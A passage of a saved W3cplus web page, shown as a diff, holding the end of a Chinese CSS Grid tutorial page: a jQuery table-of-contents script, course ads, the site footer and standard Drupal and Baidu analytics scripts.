+    <div class="node-blog-title"><div class="atalog"><ul class="mb-2"> <li><a data-index="0" href="javascript:;" class="active">定义隐式网格：grid-auto-rows/columns</a></li></ul></div></div>
+
+<script>
+$('.node-blog h2').addClass('content-title');
+$('.node-blog h3').addClass('content-title');
+$('.node-blog h4').addClass('content-title');
+$('.node-blog h5').addClass('content-title');
+//  给 h2 到 h5 增加一个 data-index 的自定义属性
+$('.node-blog h2').attr('data-index', 2);
+$('.node-blog h3').attr('data-index', 3);
+$('.node-blog h4').attr('data-index', 4);
+$('.node-blog h5').attr('data-index', 5);
+
+//  函数的一个参数是标题级别，第二个参数是第一个标题的索引值
+function atalog(titleIndex, start) {
+    //  存储 HTML 和当前的索引值
+    var el = {
+        el: '',
+        index: start
+    };
+    var current = 0;  //  已遍历的数量
+
+    for (var i = start;i < $('.content-title').length;i ++) {
+        if (i < current) {
+            //  如果当前 i 的值小于已遍历的数量就跳过
+            continue;
+        }
+
+        if ($('.content-title').eq(i).attr('data-index') > titleIndex) {
+            //  如果是更小一级的标题就调用自身继续查找
+            var result = atalog($('.content-title').eq(i).attr('data-index'), i);
+            //  把返回的 HTML 添加到当前函数的 el 中
+            el.el += '<li> ' + result.el + '</li>';
+            current = result.index + 1;  //  设置已遍历的数量
+            el.index = result.index;  //  设置索引
+            continue;  //  跳过本次循环
+        }
+
+        if ($('.content-title').eq(i).attr('data-index') < titleIndex) {
+            //  如果是更大一级的标题就返回已生成的 HTML 目录
+            el.el = '<ul class="mb-2">' + el.el + '</ul>';
+            return el;
+        }
+        //  生成 HTML 目录
+        el.el += '<li><a data-index="' + i + '" href="javascript:;">' + $('.content-title').eq(i).text() + '</a></li>';
+        el.index = i;  //  设置当前的索引值为 i
+    }
+    //  添加列表的外层 ul
+    el.el = '<ul class="mb-2"> ' + el.el + '</ul>';
+    return el;  //  返回生成的 HTML 目录
+}
+
+//  调用生成目录的函数，从第 0 个 h2 开始
+var el = atalog(2, 0);
+//  把生成的目录插入到文章的开头
+$('.node-blog-title').prepend('<div class="atalog">' + el.el + '</div>');
+$(".node-blog-title .atalog > ul > li >a ").eq(0).addClass('active');
+//  给生成的目录添加点击事件
+$('.node-blog-title .atalog a').on('click', function () {
+    //  设置滚动条的高度为标题的 offsetTop
+     var topPos = $('.content-title').eq($(this).attr('data-index')).offset().top;
+var position = topPos - 80;
+    $(document).scrollTop(position);
+$('.node-blog-title .atalog a').removeClass('active')
+    $(this).toggleClass('active')
+});
+
+
+</script>
+
+  </div>
+</div>
+<div id="block-block-49" class="block block-block">
+
+    
+  <div class="content">
+    <div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/iJrTure4/" target="_blank" title="现代 CSS"><img src="./Grid布局：6-显式网格和隐式网格_files/css-1.jpg" border="0" alt="" width="300"></a></div>
+
+<div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/DEHQUMj/" target="_blank" title="防御式 CSS 精讲"><img src="./Grid布局：6-显式网格和隐式网格_files/css-3.jpg" border="0" alt="" width="300"></a></div>
+
+<div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/iJrwMDDU/" target="_blank" title="现代 Web 布局"><img src="./Grid布局：6-显式网格和隐式网格_files/css-2.jpg" border="0" alt="" width="300"></a></div>
+
+
+  </div>
+</div>
+  </div>
+      </div>
+    
+
+  </div>
+</div>
+
+  <div id="footer-col" class="footer-col">
+    <div class="container">
+        <div class="region region-footer-col">
+    <div id="block-block-39" class="block block-block">
+
+    <h2>关于我们</h2>
+  
+  <div class="content">
+    <a class="media-object" href="http://www.w3cplus.com/">W3cplus</a>
+<div class="media-body">
+	<p>W3cplus是一个致力于推广国内前端行业的技术博客。它以探索为己任，不断活跃在行业技术最前沿，努力提供高质量前端技术博文；其文章范围广泛，主要以CSS、HTML、JavaScript、A11Y、动画等教程为主。</p>
+</div>
+  </div>
+</div>
+<div id="block-block-40" class="block block-block">
+
+    <h2>关于站长</h2>
+  
+  <div class="content">
+    <p><a class="media-object" href="https://www.w3cplus.com/" target="_blank">大漠</a></p>
+<div class="media-body">
+	<p>常用昵称“大漠”，<a href="https://www.w3cplus.com/" target="_blank">W3CPlus</a>创始人，曾就职于淘宝。对HTML、CSS和A11Y等领域有一定的认识和丰富的实践经验。现在主要从事智能UI领域的探讨和学习！。CSS和Drupal中国布道者。2014年出版《<a href="https://www.w3cplus.com/book-comment.html">图解CSS3：核心技术与案例实战</a>》。</p>
+	<div class="social">
+		<a rel="nofollow" class="github" href="https://github.com/airen" target="_blank" title="github">github</a> <a rel="nofollow" class="twitter" href="https://twitter.com/w3cplus" target="_blank" title="twitter">twitter</a></div>
+</div>
+<p>&nbsp;</p>
+  </div>
+</div>
+<div id="block-block-41" class="block block-block">
+
+    <h2>我的作品</h2>
+  
+  <div class="content">
+    <a class="media-object" href="https://www.w3cplus.com/book-comment.html" target="_blank">图解CSS3</a>
+<div class="media-body">
+	<p>本书是历时2载的心血之作，根据最新的CSS撰写，融入了作者在CSS领域多年的使用经验，旨在将本书打造成为CSS领域最权威和实用的专业著作，供没有经验的读者系统学习，供有经验的读者参考备查。新版在《<a href="https://www.w3cplus.com/blog/tags/674.html">图解SS</a>》中持续更新！</p></div>
+  </div>
+</div>
+  </div>
+    </div>
+  </div> 
+
+  <div id="footer" class="footer">
+    <div class="container">
+        <div class="region region-footer">
+    <div id="block-block-54" class="block block-block">
+
+    
+  <div class="content">
+        <p><a rel="nofollow" href="http://www.beian.miit.gov.cn/" target="_blank">湘B2-20110104-7</a>，衡阳市雅米信息技术有限公司 © 2011-2022 <a href="https://www.w3cplus.com/page/26.html" target="_blank">W3CPLUS</a>，感谢<a rel="nofollow" href="https://www.drupal.org/" target="_blank">Drupal</a>开源技术。感谢<a rel="nofollow" href="https://www.qiniu.com/" target="_blank">七牛云存储</a>提供静态资源空间。</p>
+  </div>
+</div>
+  </div>
+    </div>
+  </div> 
+
+<div id="totop" style="position: fixed; bottom: 50px; right: 15px; cursor: pointer; z-index: 999999; display: block; opacity: 1;">
+  <!-- <div id="zhi12-shang-exp-2" class="shang-wrap" style="text-align: center;position:absolute;right: 0;bottom: 130%;z-index: 9999;">
+    <div><a class="zhi12-popup zhi12-widget" rel="nofollow" href="//www.zhi12.com/paycenter/reward?entity=user&id=5491" target="_blank"><img src="/sites/default/files/blogs/2019/1905/w3cplus-shang-2.png" alt="打赏" class="share-img" /></a></div>
+</div> -->
+    <a id="topLink" title="返回顶部">返回顶部</a>
+</div>  <script type="text/javascript" src="./Grid布局：6-显式网格和隐式网格_files/js_VU7P4CTgUZdF2SyFko5LLAg9ZK0OSVjXVaAFnTLgVt0.js.下载"></script>
+  
+  <script type="text/javascript" src="./Grid布局：6-显式网格和隐式网格_files/respond.min.js.下载"></script>
+<script type="text/javascript" src="./Grid布局：6-显式网格和隐式网格_files/js_ypadrG4kz9-JBpNOXmgjyVozLCJG_1RP3Ig-iqWR8n0.js.下载"></script>
+<script type="text/javascript" src="./Grid布局：6-显式网格和隐式网格_files/js_YFY-zVcRx2bEEpwBdCXta7mOli3xeW_KMe7Y6Mv8zGk.js.下载"></script>
+<script type="text/javascript" src="./Grid布局：6-显式网格和隐式网格_files/js_xP4aMPEI1iZ1ZrZMlSgsTllQqvH8oWbOQ7JVFWyrFCo.js.下载"></script>
+<script type="text/javascript">
+<!--//--><![CDATA[//><!--
+jQuery.extend(Drupal.settings, {"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"w3cplusV2","theme_token":"YeLMP94DIiAQIX1oMQgRWhKvrRx6-Y3jirllNX7P3To","js":{"modules\/statistics\/statistics.js":1,"sites\/all\/modules\/contrib\/respondjs\/lib\/respond.min.js":1,"sites\/all\/modules\/contrib\/jquery_update\/replace\/jquery\/1.10\/jquery.min.js":1,"misc\/jquery-extend-3.4.0.js":1,"misc\/jquery-html-prefilter-3.5.0-backport.js":1,"misc\/jquery.once.js":1,"misc\/drupal.js":1,"public:\/\/languages\/zh-hans_71GwLEjcRL9b45LGd77xwMMW4YJ5etdnokx7XZMwKAc.js":1,"sites\/all\/modules\/contrib\/custom_search\/js\/custom_search.js":1,"sites\/all\/themes\/w3cplusV2\/js\/highlight.pack.js":1,"sites\/all\/themes\/w3cplusV2\/js\/main.js":1},"css":{"modules\/system\/system.base.css":1,"modules\/system\/system.menus.css":1,"modules\/system\/system.messages.css":1,"modules\/system\/system.theme.css":1,"modules\/field\/theme\/field.css":1,"modules\/node\/node.css":1,"modules\/search\/search.css":1,"modules\/user\/user.css":1,"sites\/all\/modules\/contrib\/views\/css\/views.css":1,"sites\/all\/modules\/contrib\/ckeditor\/ckeditor.css":1,"sites\/all\/modules\/contrib\/ctools\/css\/ctools.css":1,"sites\/all\/modules\/contrib\/paywall\/includes\/paywall_php_sdk\/paywall.css":1,"sites\/all\/modules\/contrib\/custom_search\/custom_search.css":1,"sites\/all\/themes\/w3cplusV2\/css\/style.css":1}},"custom_search":{"form_target":"_self","solr":0},"statistics":{"data":{"nid":"2716"},"url":"\/modules\/statistics\/statistics.php"},"urlIsAjaxTrusted":{"\/css\/grid-layout-part-6.html?expire=1699848490\u0026code=0i-_V80maLg\u0026sign=bb8336ce2ffce6a5c7994526f8ccf5a7":true}});
+//--><!]]>
+</script>
+<script src="./Grid布局：6-显式网格和隐式网格_files/jquery.colorbox-min.js.下载"></script>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?177319b798978621f83845b12c86fa29";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>  
+<span class="1fe78"></span>
+<div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button type="button" id="cboxSlideshow"></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none; max-width: none;"></div></div></body></html>
